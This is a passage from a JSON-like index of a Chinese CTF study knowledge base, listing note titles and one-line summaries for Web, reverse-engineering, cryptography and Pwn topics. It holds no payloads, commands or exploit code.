              "summary": "\u670D\u52A1\u7AEF\u628A\u300C\u7528\u6237\u7684\u8F93\u5165\u300D\u9001\u56DE\u6D4F\u89C8\u5668\u4E4B\u540E\u53D1\u751F\u7684\u653B\u51FB\u3002\u6838\u5FC3\u4E0D\u662F\u5F39\u7A97\uFF0C\u800C\u662F**\u6709\u56DE\u663E/\u65E0\u56DE\u663E\u4E0B\u600E\u4E48\u628A\u6570\u636E\u5E26\u51FA\u6765**\uFF1AXSS \u5224\u578B \u2192 \u7ED5\u8FC7 \u2192 \u5916\u5E26\uFF0C\u4EE5\u53CA CSRF\u3001\u70B9\u51FB\u52AB\u6301\u3001postMessage\u3001\u539F\u578B\u94FE\u6C61\u67D3\u3001\u524D\u7AEF\u6846\u67B6\u9677\u9631\u8FD9\u4E9B\u300C\u4E0D\u5F39 alert \u4E5F\u80FD\u62FF\u6570\u636E\u300D\u7684\u8DEF\u5F84\u3002"
            },
            {
              "name": "Web-\u903B\u8F91\u6F0F\u6D1E\u4E0E\u652F\u4ED8\u5B89\u5168",
              "title": "Web \u903B\u8F91\u6F0F\u6D1E\u4E0E\u652F\u4ED8\u5B89\u5168",
              "summary": '\u4E0D\u9760\u6CE8\u5165/\u4E0A\u4F20\uFF0C\u800C\u662F"\u4EE3\u7801\u903B\u8F91\u5199\u9519\u4E86"\u9020\u6210\u7684\u8D8A\u6743\u3001\u7ED5\u8FC7\u4E0E\u8585\u7F8A\u6BDB\u3002\u8FD9\u7C7B\u9898**\u6CA1\u6709\u901A\u7528 payload**\uFF0C\u8003\u7684\u662F\u628A\u4E1A\u52A1\u6D41\u7A0B\u5F53\u72B6\u6001\u673A\u6765\u63A8\u7406\u3002'
            },
            {
              "name": "Web-\u547D\u4EE4\u6267\u884C\u4E0ESSTI",
              "title": "Web-\u547D\u4EE4\u6267\u884C\u4E0ESSTI",
              "summary": '\u76EE\u6807\u90FD\u662F"\u8BA9\u670D\u52A1\u5668\u6267\u884C\u6211\u4EEC\u60F3\u6267\u884C\u7684\u4E1C\u897F"\u3002\u533A\u522B\u5728\u4E8E\uFF1A\u547D\u4EE4\u6267\u884C\u662F\u76F4\u63A5\u5728 shell \u91CC\u8DD1\uFF0CSSTI \u662F\u501F\u6A21\u677F\u5F15\u64CE\u7684\u624B\u8DD1\u3002'
            },
            {
              "name": "Web-\u8BF7\u6C42\u8D70\u79C1\u4E0E\u534F\u8BAE\u5C42\u653B\u51FB",
              "title": "Web-\u8BF7\u6C42\u8D70\u79C1\u4E0E\u534F\u8BAE\u5C42\u653B\u51FB",
              "summary": '\u524D\u7AEF\uFF08\u53CD\u4EE3/\u8D1F\u8F7D\u5747\u8861\uFF09\u548C\u540E\u7AEF\uFF08\u5E94\u7528\u670D\u52A1\u5668\uFF09**\u5BF9"\u4E00\u4E2A\u8BF7\u6C42\u5230\u54EA\u7ED3\u675F"\u7406\u89E3\u4E0D\u4E00\u81F4**\u65F6\uFF0C\u591A\u51FA\u6765\u7684\u5B57\u8282\u4F1A\u88AB\u5F53\u6210"\u4E0B\u4E00\u4E2A\u8BF7\u6C42"\u2014\u2014\u8FD9\u5C31\u662F\u8BF7\u6C42\u8D70\u79C1\u3002CTF \u91CC\u5B83\u5E38\u662F**\u7ED5\u8FC7\u524D\u7AEF ACL\u3001\u76F4\u63A5\u6253\u5185\u90E8\u7AEF\u70B9**\u7684\u90A3\u628A\u94A5\u5319\u3002'
            },
            {
              "name": "Web-\u8BA4\u8BC1\u4E0E\u4F1A\u8BDD\u6F0F\u6D1E",
              "title": "Web-\u8BA4\u8BC1\u4E0E\u4F1A\u8BDD\u6F0F\u6D1E",
              "summary": '\u56F4\u7ED5"\u4F60\u662F\u8C01\u3001\u4F60\u600E\u4E48\u8BC1\u660E"\u7684\u90E8\u5206\uFF1A\u767B\u5F55\u3001Cookie/Session\u3001Token\uFF08JWT\uFF09\u3001\u8D8A\u6743\u3002**CTF \u91CC\u8FD9\u9875\u7684\u77E5\u8BC6\u7ECF\u5E38\u662F\u62FF\u5230\u7B2C\u4E00\u8DF3\u51ED\u636E\u7684\u94A5\u5319\u3002**'
            },
            {
              "name": "Web-\u6587\u4EF6\u5305\u542B\u4E0E\u4E0A\u4F20",
              "title": "Web-\u6587\u4EF6\u5305\u542B\u4E0E\u4E0A\u4F20",
              "summary": "\u4E24\u5144\u5F1F\uFF1A**\u5305\u542B**\uFF08\u628A\u670D\u52A1\u5668\u4E0A\u7684\u522B\u7684\u6587\u4EF6\u5F53\u4EE3\u7801/\u5185\u5BB9\u8BFB\u8FDB\u6765\uFF09\u548C**\u4E0A\u4F20**\uFF08\u628A\u81EA\u5DF1\u5199\u7684\u6587\u4EF6\u653E\u5230\u670D\u52A1\u5668\u4E0A\uFF09\u3002\u5355\u7528\u5F80\u5F80\u53EA\u80FD\u8BFB\u6587\u4EF6\uFF0C\u7EC4\u5408\u8D77\u6765\u624D\u662F RCE\u3002"
            },
            {
              "name": "Web-\u6E90\u7801\u6CC4\u9732\u4E0E\u4FE1\u606F\u6536\u96C6",
              "title": "Web-\u6E90\u7801\u6CC4\u9732\u4E0E\u4FE1\u606F\u6536\u96C6",
              "summary": '**\u4FE1\u606F\u6536\u96C6\u4E0D\u662F"\u5F00\u59CB\u524D\u968F\u4FBF\u8DD1\u4E24\u4E0B"\uFF0C\u800C\u662F\u8D2F\u7A7F\u5168\u7A0B\u7684\u52A8\u4F5C\u3002** \u5927\u591A\u6570"\u5361\u4F4F\u4E86"\u7684\u65F6\u523B\uFF0C\u7B54\u6848\u5728\u67D0\u4E2A\u8FD8\u6CA1\u770B\u7684\u5730\u65B9\u3002'
            },
            {
              "name": "Web-CVE\u590D\u73B0\u4E0E\u5DF2\u77E5\u6F0F\u6D1E\u5229\u7528",
              "title": "Web-CVE\u590D\u73B0\u4E0E\u5DF2\u77E5\u6F0F\u6D1E\u5229\u7528",
              "summary": "\u4E00\u9053 Web \u9898\u6CA1\u7ED9\u6E90\u7801\u3001\u4E5F\u6CA1\u7ED9\u660E\u663E\u903B\u8F91\u6F0F\u6D1E\u65F6\uFF0C\u5148\u522B\u6025\u7740 fuzz\u3002**\u6D41\u7A0B\u662F\uFF1A\u8BC6\u522B\u7EC4\u4EF6\uFF08\u6307\u7EB9\uFF09\u2192 \u5B9A\u4F4D\u7248\u672C \u2192 \u7248\u672C\u6620\u5C04\u5230\u5DF2\u77E5 CVE \u2192 \u53D6\u516C\u5F00 PoC \u2192 \u6309\u76EE\u6807\u73AF\u5883\u9002\u914D \u2192 \u6253\u901A**\u3002\u672C\u9875\u89E3\u51B3\u300C\u600E\u4E48\u77E5\u9053\u8BE5\u6253\u54EA\u4E2A N-day\u300D\u4E0E\u300CPoC \u4E3A\u4EC0\u4E48\u5728\u4F60\u624B\u4E0A\u8DD1\u4E0D\u901A\u300D\u3002"
            },
            {
              "name": "Web-SQL\u6CE8\u5165",
              "title": "Web-SQL\u6CE8\u5165",
              "summary": "\u628A\u7528\u6237\u8F93\u5165\u5F53\u6210 SQL \u8BED\u53E5\u7684\u4E00\u90E8\u5206\u6267\u884C\uFF0C\u4ECE\u800C\u8BFB\u5E93\u3001\u7ED5\u8FC7\u767B\u5F55\u3001\u5728\u90E8\u5206\u573A\u666F\u4E0B\u5199\u6587\u4EF6\u6216\u6267\u884C\u547D\u4EE4\u3002**\u5224\u65AD\u987A\u5E8F\u6C38\u8FDC\u662F\uFF1A\u5148\u627E\u5DEE\u5F02\uFF0C\u518D\u5B9A\u7C7B\u578B\uFF0C\u6700\u540E\u624D\u8C08\u5229\u7528\u3002**"
            },
            {
              "name": "Web-SSRF\u4E0EXXE",
              "title": "Web-SSRF\u4E0EXXE",
              "summary": '\u4E24\u4E2A"\u501F\u670D\u52A1\u5668\u7684\u8EAB\u4EFD\u53BB\u8BF7\u6C42"\u7684\u6F0F\u6D1E\uFF1ASSRF \u8BA9\u670D\u52A1\u5668\u66FF\u6211\u4EEC\u53D1 HTTP \u8BF7\u6C42\uFF0CXXE \u8BA9\u89E3\u6790\u5668\u66FF\u6211\u4EEC\u8BFB\u672C\u5730\u6587\u4EF6/\u53D1\u8BF7\u6C42\u3002\u5171\u540C\u70B9\u662F\u2014\u2014**\u628A\u81EA\u5DF1\u4F2A\u88C5\u6210"\u5185\u7F51\u53EF\u4FE1\u6765\u6E90"\u3002**'
            }
          ]
        },
        {
          "id": "reverse",
          "title": "\u9006\u5411",
          "notes": [
            {
              "name": "\u9006\u5411-\u52A8\u6001\u8C03\u8BD5\u4E0E\u6A21\u62DF\u6267\u884C",
              "title": "\u9006\u5411-\u52A8\u6001\u8C03\u8BD5\u4E0E\u6A21\u62DF\u6267\u884C",
              "summary": '\u9759\u6001\u770B\u4E0D\u6E05\uFF08\u53CD\u8C03\u8BD5 / SMC / \u81EA\u6821\u9A8C / \u8FD0\u884C\u65F6\u89E3\u5BC6 / \u8DE8\u67B6\u6784\uFF09\u65F6\uFF0C\u5C31"\u8BA9\u5B83\u8DD1\u8D77\u6765\u770B"\u3002\u8FD9\u9875\u6309**"\u8981\u89E3\u51B3\u4EC0\u4E48\u95EE\u9898 \u2192 \u7528\u54EA\u4E2A\u5DE5\u5177"**\u7EC4\u7EC7\uFF1Agdb/pwndbg\u3001ltrace/strace\u3001Frida\u3001LD_PRELOAD\u3001Unicorn\u3001QEMU user-mode\u3001angr\uFF0C\u6700\u540E\u662F**\u5185\u5B58 dump \u76F4\u63A5\u635E flag** \u8FD9\u79CD\u6536\u5C3E\u6700\u5FEB\u7684\u6253\u6CD5\u3002'
            },
            {
              "name": "\u9006\u5411-\u591A\u8BED\u8A00\u4E0E\u591A\u5E73\u53F0",
              "title": "\u9006\u5411-\u591A\u8BED\u8A00\u4E0E\u591A\u5E73\u53F0",
              "summary": '\u62FF\u5230\u4E00\u4E2A\u4E0D\u8BA4\u8BC6\u7684\u6587\u4EF6\uFF0C**\u7B2C\u4E00\u4EF6\u4E8B\u4E0D\u662F\u62D6\u8FDB IDA\uFF0C\u800C\u662F\u5224"\u5B83\u662F\u4EC0\u4E48\u8BED\u8A00\u3001\u4EC0\u4E48\u5E73\u53F0\u7F16\u8BD1\u7684"**\u2014\u2014\u5224\u9519\u8BED\u8A00\uFF0C\u53CD\u7F16\u8BD1\u7ED3\u679C\u4F1A\u662F\u4E00\u5806\u770B\u4E0D\u61C2\u7684\u8FD0\u884C\u65F6\u80F6\u6C34\u3002\u8FD9\u9875\u7ED9\u300C\u770B\u6587\u4EF6\u5148\u5224\u8BED\u8A00/\u5E73\u53F0\u300D\u7684\u5224\u636E\u8868\uFF0C\u518D\u7ED9 Go / Rust / .NET / C++ / Python / Android / WASM / \u56FA\u4EF6\u5404\u81EA\u7684\u7B26\u53F7\u6062\u590D\u4E0E\u9AA8\u67B6\u3002'
            },
            {
              "name": "\u9006\u5411-\u6076\u610F\u8F6F\u4EF6\u5206\u6790",
              "title": "\u9006\u5411-\u6076\u610F\u8F6F\u4EF6\u5206\u6790",
              "summary": "\u7ED9\u4E00\u4E2A\u6765\u8DEF\u4E0D\u660E\u7684\u6837\u672C\uFF0C\u56DE\u7B54\u4E09\u4E2A\u95EE\u9898\u2014\u2014**\u8FD9\u662F\u4EC0\u4E48\uFF08\u9759\u6001\uFF09\u3001\u5E72\u4E86\u4EC0\u4E48\uFF08\u52A8\u6001\uFF09\u3001\u600E\u4E48\u901A\u4FE1\uFF08\u7F51\u7EDC IOC\uFF09**\u3002\u8FD9\u9875\u7ED9\u7684\u662F\u300C\u5148\u9694\u79BB\u540E\u52A8\u624B\u300D\u7684\u64CD\u4F5C\u987A\u5E8F\u3001\u4E00\u5F20\u300C\u770B\u5230\u4EC0\u4E48 \u21D2 \u7528\u54EA\u4E2A\u624B\u6CD5\u300D\u7684\u5224\u636E\u8868\uFF0C\u4EE5\u53CA\u9759\u6001/\u52A8\u6001/\u8131\u58F3/\u6301\u4E45\u5316/IOC/YARA \u7684\u53EF\u8DD1\u9AA8\u67B6\uFF1BCTF \u91CC\u5B83\u5BF9\u5E94\u6837\u672C\u5206\u6790\u9898\u3001\u52D2\u7D22\u6728\u9A6C\u9898\u3001IOC \u63D0\u53D6\u9898\u3002"
            },
            {
              "name": "\u9006\u5411-\u53CD\u8C03\u8BD5\u4E0E\u6DF7\u6DC6\u5BF9\u6297",
              "title": "\u9006\u5411-\u53CD\u8C03\u8BD5\u4E0E\u6DF7\u6DC6\u5BF9\u6297",
              "summary": '\u76EE\u6807\u7A0B\u5E8F\u4E3B\u52A8\u68C0\u6D4B"\u4F60\u662F\u4E0D\u662F\u5728\u8C03\u6211"\uFF08\u8C03\u8BD5\u5668 / \u865A\u62DF\u673A / \u52A8\u6001\u63D2\u6869 / \u88AB\u6539\u8FC7\u7684\u4EE3\u7801\uFF09\uFF0C\u68C0\u6D4B\u5230\u5C31\u8D70**\u5047\u5206\u652F\u6216\u81EA\u6740**\u3002\u8FD9\u9875\u7ED9\u300C\u68C0\u6D4B\u624B\u6CD5 \u2192 \u9996\u9009\u7ED5\u8FC7\u300D\u7684\u5224\u636E\u8868\uFF0C\u518D\u7ED9**\u8131\u58F3 / SMC \u81EA\u4FEE\u6539 / OLLVM \u6DF7\u6DC6**\u4E09\u7C7B\u300C\u9759\u6001\u770B\u4E0D\u6E05\u300D\u7684\u8FD8\u539F\u601D\u8DEF\u3002\u7ED5\u4E0D\u8FC7\u53CD\u8C03\u8BD5\uFF0C\u540E\u9762\u6240\u6709\u9759\u6001\u5206\u6790\u90FD\u53EF\u80FD\u662F\u5047\u7684\u3002'
            },
            {
              "name": "\u9006\u5411-\u56FA\u4EF6\u4E0E\u5D4C\u5165\u5F0F\u5206\u6790",
              "title": "\u9006\u5411-\u56FA\u4EF6\u4E0E\u5D4C\u5165\u5F0F\u5206\u6790",
              "summary": '\u4E00\u53E5\u8BDD\u6458\u8981\uFF1A\u62FF\u5230 `.bin`/`.img`/OTA \u5305\u6216\u4E00\u5757\u8BFB\u4E0B\u6765\u7684 flash \u4E4B\u540E\uFF0C\u600E\u4E48\u5B9A\u4F4D\u6587\u4EF6\u7CFB\u7EDF\u3001\u89E3\u5305\u63D0\u53D6\u3001\u5728 rootfs \u91CC\u6316\u540E\u95E8\u4E0E\u786C\u7F16\u7801\u51ED\u636E\u3001\u5BA1\u8BA1 Web \u63A5\u53E3\u3001\u518D\u628A\u5B83\u6A21\u62DF\u8DD1\u8D77\u6765\u2014\u2014\u4E00\u5F20"**\u71B5/\u9B54\u6570/\u4E32\u53E3\u8F93\u51FA \u21D2 \u8BE5\u7528\u54EA\u628A\u9524\u5B50**"\u7684\u5224\u636E\u8868\uFF0C\u52A0\u5168\u5957\u53EF\u8DD1\u547D\u4EE4\u4E0E\u8FB9\u754C\u8BF4\u660E\u3002'
            },
            {
              "name": "\u9006\u5411-\u7B97\u6CD5\u8BC6\u522B\u4E0E\u5B9E\u6218\u6848\u4F8B",
              "title": "\u9006\u5411-\u7B97\u6CD5\u8BC6\u522B\u4E0E\u5B9E\u6218\u6848\u4F8B",
              "summary": '[[\u9006\u5411-Reverse\u65B9\u6CD5\u8BBA]] \u8BB2"\u600E\u4E48\u8D70\u5230\u6BD4\u8F83\u70B9"\uFF0C\u8FD9\u9875\u8BB2**\u8BA4\u51FA\u5B83\u662F\u4EC0\u4E48\u7B97\u6CD5**\uFF08\u5E38\u91CF\u8868 + \u7ED3\u6784\uFF09\u548C**\u6211\u4EEC\u5B9E\u6218\u91CC\u8E29\u8FC7\u7684\u5177\u4F53\u5751**\u30020xGame \u7684\u9006\u5411/\u7B97\u6CD5\u9898\u51E0\u4E4E\u5168\u80FD\u5728\u8FD9\u9875\u627E\u5230\u5BF9\u5E94\u3002'
            },
            {
              "name": "\u9006\u5411-Reverse\u65B9\u6CD5\u8BBA",
              "title": "\u9006\u5411-Reverse\u65B9\u6CD5\u8BBA",
              "summary": '\u62FF\u5230\u4E00\u4E2A\u964C\u751F\u4E8C\u8FDB\u5236\uFF0C**\u5148\u7528 `file` / `strings` \u628A"\u5B83\u662F\u8C01\u3001\u7528\u4EC0\u4E48\u5199\u7684"\u9489\u6B7B\uFF0C\u8DEF\u7EBF\u5C31\u5B9A\u4E86\u4E03\u516B\u6210**\uFF1B\u8FD9\u9875\u7ED9\u7684\u662F\u90A3\u5957"\u5224\u65AD\u7C7B\u578B \u2192 \u9009\u5DE5\u5177\u94FE \u2192 \u627E\u6BD4\u8F83\u70B9"\u7684\u51B3\u7B56\u6D41\u7A0B\uFF0C\u800C\u4E0D\u662F\u6C47\u7F16\u6559\u7A0B\u3002'
            }
          ]
        },
        {
          "id": "crypto",
          "title": "\u5BC6\u7801\u5B66",
          "notes": [
            {
              "name": "\u5BC6\u7801\u5B66-\u5BF9\u79F0\u52A0\u5BC6\u4E0E\u54C8\u5E0C",
              "title": "\u5BC6\u7801\u5B66-\u5BF9\u79F0\u52A0\u5BC6\u4E0E\u54C8\u5E0C",
              "summary": '\u672C\u9875\u89E3\u51B3\u4E00\u4E2A\u95EE\u9898\uFF1A**\u62FF\u5230\u5BF9\u79F0\u52A0\u5BC6 / \u54C8\u5E0C\u7684\u6E90\u7801 + \u5BC6\u6587\uFF0C30 \u79D2\u5185\u5B9A\u4F4D"\u53EF\u653B\u51FB\u70B9"**\u2014\u2014ECB\uFF1FIV \u53EF\u63A7\uFF1Fnonce \u590D\u7528\uFF1F\u5F31\u968F\u673A\uFF1F\u5F31\u54C8\u5E0C\uFF1F\u4E0D\u89E3\u91CA AES \u662F\u4EC0\u4E48\uFF0C\u53EA\u5199\u5224\u636E\u3001\u811A\u672C\u548C\u5DE5\u5177\u3002\u53E4\u5178\u5BC6\u7801\u89C1 [[\u5BC6\u7801\u5B66-\u53E4\u5178\u5BC6\u7801]]\uFF0C\u516C\u94A5\u89C1 [[\u5BC6\u7801\u5B66-RSA\u653B\u51FB]]\u3002'
            },
            {
              "name": "\u5BC6\u7801\u5B66-\u683C\u4E0E\u692D\u5706\u66F2\u7EBF",
              "title": "\u5BC6\u7801\u5B66-\u683C\u4E0E\u692D\u5706\u66F2\u7EBF",
              "summary": '\u62FF\u5230\u4E00\u7EC4\u66F2\u7EBF\u53C2\u6570\u5148\u505A\u4EC0\u4E48\uFF1F\u8FD9\u9875\u662F\u4E00\u5F20 **ECC \u653B\u51FB\u51B3\u7B56\u8868**\uFF1A\u66F2\u7EBF\u57FA\u7840\u4E0E Hasse \u754C \u2192 \u6309\u6761\u4EF6\u9009\u653B\u51FB\u7684\u5224\u636E\u8868 \u2192 \u516D\u7C7B\u653B\u51FB\u9AA8\u67B6\uFF08Smart / \u5947\u5F02 / MOV / Pohlig-Hellman / \u65E0\u6548\u66F2\u7EBF / ECDSA nonce\uFF09\u2192 DH \u4E0E\u5C0F\u7FA4\u653B\u51FB\uFF0C\u5916\u52A0 0xGame 493 Ez_ECC \u5B9E\u6218\u3002**\u672C\u9875\u662F\u5E93\u4E2D"\u692D\u5706\u66F2\u7EBF"\u8FD9\u6761\u7EBF\u7684\u552F\u4E00\u6743\u5A01\u9875**\uFF1B\u683C\u7684\u65B9\u6CD5\u8BBA\u89C1 [[\u5BC6\u7801\u5B66-\u683C\u4E0ELLL]]\u3002'
            },
            {
              "name": "\u5BC6\u7801\u5B66-\u683C\u4E0ELLL",
              "title": "\u5BC6\u7801\u5B66-\u683C\u4E0ELLL",
              "summary": '\u7528\u683C\u57FA\u7EA6\u7B80\uFF08LLL / BKZ\uFF09\u628A"\u6574\u6570\u65B9\u7A0B\u91CC\u7684\u5C0F\u672A\u77E5\u6570"\u635E\u51FA\u6765\uFF1ASVP/CVP \u76F4\u89C9\u3001LLL \u9020\u683C\u56DB\u6B65\u3001Coppersmith \u5224\u636E\u3001\u5E38\u89C1\u683C\u9898\u901F\u67E5\u3001\u80CC\u5305\u4E0E HNP/LCG \u4E24\u4E2A\u53EF\u8DD1\u9AA8\u67B6\uFF0C\u5916\u52A0 0xGame 496 / 495 / 497 \u7684\u5B9E\u6218\u6559\u8BAD\u3002**\u672C\u9875\u662F\u5E93\u4E2D"\u683C"\u8FD9\u6761\u7EBF\u7684\u552F\u4E00\u6743\u5A01\u9875**\uFF1B\u692D\u5706\u66F2\u7EBF\u89C1 [[\u5BC6\u7801\u5B66-\u683C\u4E0E\u692D\u5706\u66F2\u7EBF]]\u3002'
            },
            {
              "name": "\u5BC6\u7801\u5B66-\u53E4\u5178\u5BC6\u7801",
              "title": "\u5BC6\u7801\u5B66-\u53E4\u5178\u5BC6\u7801",
              "summary": '\u62FF\u5230\u4E00\u4E32"\u50CF\u4E71\u7801\u4F46\u4E0D\u662F\u7F16\u7801"\u7684\u4E1C\u897F\uFF1A\u5148\u5224\u5B9A\u5B83\u662F**\u5355\u8868\u66FF\u6362 / \u591A\u8868\u66FF\u6362 / \u7F6E\u6362 / \u73B0\u4EE3\u52A0\u5BC6**\u4E2D\u7684\u54EA\u4E00\u7C7B\uFF0C\u518D\u6309\u987A\u5E8F\u8BD5\u5BF9\u5E94\u7684\u7834\u89E3\u8DEF\u5F84\u3002'
            },
            {
              "name": "\u5BC6\u7801\u5B66-\u54C8\u5E0C\u653B\u51FB\u4E0E\u7B7E\u540D\u4F2A\u9020",
              "title": "\u5BC6\u7801\u5B66-\u54C8\u5E0C\u653B\u51FB\u4E0E\u7B7E\u540D\u4F2A\u9020",
              "summary": '\u54C8\u5E0C\u4E0E\u7B7E\u540D\u7684\u9898\uFF0C\u80DC\u8D1F\u5F80\u5F80\u4E0D\u5728"\u80FD\u4E0D\u80FD\u7834"\uFF0C\u800C\u5728**\u8BA4\u51FA\u8FD9\u4E2A\u6784\u9020\u5C5E\u4E8E\u54EA\u4E00\u7C7B**\uFF1A\u662F Merkle-Damg\xE5rd \u7684\u957F\u5EA6\u6269\u5C55\u3001\u662F CRC \u7684\u7EBF\u6027\u3001\u662F RSA \u7684\u540C\u6001\u3001\u8FD8\u662F padding \u9884\u8A00\u673A\u3002\u8FD9\u4E00\u9875\u7ED9\u7684\u662F"\u770B\u5230\u4EC0\u4E48\u6761\u4EF6 \u2192 \u9009\u54EA\u79CD\u653B\u51FB"\u7684\u5224\u636E\u8868\uFF0C\u5916\u52A0\u53EF\u8DD1\u9AA8\u67B6\u3002'
            },
            {
              "name": "\u5BC6\u7801\u5B66-PRNG\u4E0E\u6D41\u5BC6\u7801",
              "title": "\u5BC6\u7801\u5B66-PRNG\u4E0E\u6D41\u5BC6\u7801",
              "summary": '\u628A"\u968F\u673A"\u53D8\u6210"\u53EF\u9884\u6D4B"\uFF1A\u5148\u8BA4\u51FA\u76EE\u6807\u7528\u7684\u662F\u54EA\u4E00\u79CD PRNG\uFF0C\u518D\u51D1\u591F**\u6062\u590D\u72B6\u6001\u6240\u9700\u7684\u89C2\u6D4B\u91CF**\uFF0C\u7136\u540E\u5411\u524D\uFF08\u6216\u5411\u540E\uFF09\u63A8\u3002\u5168\u7BC7\u7684\u6838\u5FC3\u5224\u636E\u53EA\u6709\u4E00\u53E5\u8BDD\u2014\u2014**\u6BCF\u79CD PRNG \u9700\u8981\u591A\u5C11\u8F93\u51FA\u624D\u80FD\u6062\u590D**\u3002'
            },
            {
              "name": "\u5BC6\u7801\u5B66-RSA\u653B\u51FB",
              "title": "\u5BC6\u7801\u5B66-RSA\u653B\u51FB",
              "summary": '\u4E00\u53E5\u8BDD\u6458\u8981\uFF1A\u62FF\u5230\u4E00\u7EC4 RSA \u53C2\u6570\u4E0D\u77E5\u9053\u4ECE\u54EA\u4E0B\u624B\uFF1F\u8FD9\u9875\u662F\u4E00\u68F5**\u53EF\u67E5\u8868\u7684\u653B\u51FB\u51B3\u7B56\u6811**\u2014\u2014\u5148\u505A\u53C2\u6570\u4F53\u68C0\uFF0C\u518D\u6309"n \u80FD\u4E0D\u80FD\u5206\u89E3 / e \u591A\u5927 / \u6CC4\u6F0F\u4E86\u4EC0\u4E48 / \u6709\u6CA1\u6709 oracle"\u56DB\u6761\u5206\u652F\u9009\u653B\u51FB\uFF0C\u800C\u4E0D\u662F\u65E0\u8111\u4E0A RsaCtfTool \u786C\u626B\u3002'
            },
            {
              "name": "\u5BC6\u7801\u5B66-ZKP\u4E0E\u7EA6\u675F\u6C42\u89E3",
              "title": "\u5BC6\u7801\u5B66-ZKP\u4E0E\u7EA6\u675F\u6C42\u89E3",
              "summary": '\u4E00\u7C7B\u9898\u7684\u672C\u8D28\u4E0D\u662F"\u7834\u5BC6\u7801"\uFF0C\u800C\u662F"**\u628A\u68C0\u67E5\u903B\u8F91\u6284\u6210\u7EA6\u675F\uFF0C\u8BA9\u6C42\u89E3\u5668\u628A\u7B54\u6848\u5410\u51FA\u6765**"\u3002\u8FD9\u4E00\u9875\u7ED9\u4E09\u6837\u4E1C\u897F\uFF1Az3 / GF(2) / \u96C6\u5408\u4EA4\u96C6\u7684**\u9009\u62E9\u5224\u636E**\u3001\u5EFA\u6A21\u8303\u5F0F\u4E0E\u53EF\u8DD1\u9AA8\u67B6\uFF0C\u4EE5\u53CA\u96F6\u77E5\u8BC6\u8BC1\u660E\u4E0E SPN \u91CC"\u4ECE\u534F\u8BAE\u7F3A\u9677\u800C\u975E\u7B97\u6CD5\u5F3A\u5EA6\u4E0B\u624B"\u7684\u6253\u6CD5\u3002'
            }
          ]
        },
        {
          "id": "pwn",
          "title": "Pwn",
          "notes": [
            {
              "name": "Pwn-\u5806\u5229\u7528",
              "title": "Pwn-\u5806\u5229\u7528",
              "summary": '\u8FD9\u9875\u89E3\u51B3\u4E00\u4E2A\u95EE\u9898\uFF1A\u62FF\u5230\u4E00\u9053\u5806\u9898\uFF0C\u4ECE"\u786E\u8BA4 glibc \u7248\u672C"\u5230"\u9009\u51FA\u80FD\u62FC\u901A\u7684\u5229\u7528\u94FE"\u4E2D\u95F4\u770B\u4EC0\u4E48\u3001\u6309\u4EC0\u4E48\u987A\u5E8F\u5224\u65AD\u3002\u6808\u65B9\u5411\u5F52 [[Pwn-\u6808\u6EA2\u51FA\u4E0EROP]]\uFF0C\u8FD9\u91CC\u53EA\u5199\u5806\u672C\u8EAB\u4E0E\u6700\u540E\u7684\u6536\u5C3E\u63A5\u53E3\u3002'
            },
            {
              "name": "Pwn-\u9AD8\u7EA7\u5229\u7528\u539F\u8BED",
              "title": "Pwn-\u9AD8\u7EA7\u5229\u7528\u539F\u8BED",
              "summary": '\u6808\u6EA2\u51FA\u3001\u5806\u5229\u7528\u7684\u6807\u51C6\u6253\u6CD5\u8D70\u4E0D\u901A\u65F6\uFF0C\u7528\u7684\u4E00\u7EC4**\u8DE8\u573A\u666F\u539F\u8BED**\uFF1A\u5728\u4FDD\u62A4\u53D7\u9650\u3001gadget \u7A00\u7F3A\u3001\u6CA1\u6709\u6CC4\u6F0F\u7684\u6761\u4EF6\u4E0B\uFF0C\u77E5\u9053"\u4EC0\u4E48\u6761\u4EF6\u6362\u4E0A\u54EA\u4E00\u79CD\u624B\u6CD5"\u3002\u672C\u9875\u662F [[Pwn-\u6808\u6EA2\u51FA\u4E0EROP]] \u4E0E [[Pwn-\u5806\u5229\u7528]] \u7684\u8FDB\u9636\u8865\u4E01\uFF0C\u53EA\u6536\u5B83\u4EEC\u6CA1\u5C55\u5F00\u3001\u53C8\u53CD\u590D\u51FA\u73B0\u7684\u90A3\u51E0\u79CD\u3002'
            },
            {
              "name": "Pwn-\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u4E0E\u6C99\u7BB1\u7ED5\u8FC7",
              "title": "Pwn-\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u4E0E\u6C99\u7BB1\u7ED5\u8FC7",
              "summary": '\u6808\u6EA2\u51FA\u4E4B\u5916\u7684\u4E24\u5927\u9AD8\u9891\u8003\u70B9\uFF1A**\u770B\u5230 `printf(buf)` \u600E\u4E48\u628A"\u80FD\u8BFB\u80FD\u5199"\u53D8\u6210\u4EFB\u610F\u8BFB\u5199\uFF0C\u770B\u5230 `seccomp` \u6321\u6389 `execve` \u4E4B\u540E\u600E\u4E48\u7528 ROP \u76F4\u63A5\u8BFB\u6587\u4EF6**\u2014\u2014\u4E24\u6761\u8DEF\u90FD\u4E0D\u9700\u8981 getshell\u3002'
            },
            {
              "name": "Pwn-\u6D4F\u89C8\u5668\u4E0EV8\u5229\u7528",
              "title": "Pwn-\u6D4F\u89C8\u5668\u4E0EV8\u5229\u7528",
              "summary": "\u628A JS \u5F15\u64CE\uFF08\u4E3B\u8981\u662F V8\uFF09\u7684\u7C7B\u578B\u6DF7\u6DC6 / \u8D8A\u754C\u8BFB\u5199\u53D8\u6210 addrof + fakeobj \u539F\u8BED\uFF0C\u518D\u642D\u51FA\u4EFB\u610F\u8BFB\u5199\uFF0C\u6700\u540E\u7ECF WASM RWX \u9875\u6216 JIT \u62FF code execution\u3002\u672C\u9875\u7ED9\u5BF9\u8C61\u5E03\u5C40\u4E0E\u6307\u9488\u538B\u7F29\u901F\u67E5\u3001`--allow-natives-syntax` \u8C03\u8BD5\u9AA8\u67B6\u3001\u300C\u89C2\u6D4B\u5230\u4EC0\u4E48 \u21D2 \u7528\u54EA\u4E2A\u624B\u6CD5\u300D\u5224\u636E\u8868\uFF0C\u4EE5\u53CA\u5B8C\u6574\u5229\u7528\u94FE\u6A21\u677F\u3002"
            },
            {
              "name": "Pwn-\u5185\u6838\u5229\u7528",
              "title": "Pwn-\u5185\u6838\u5229\u7528",
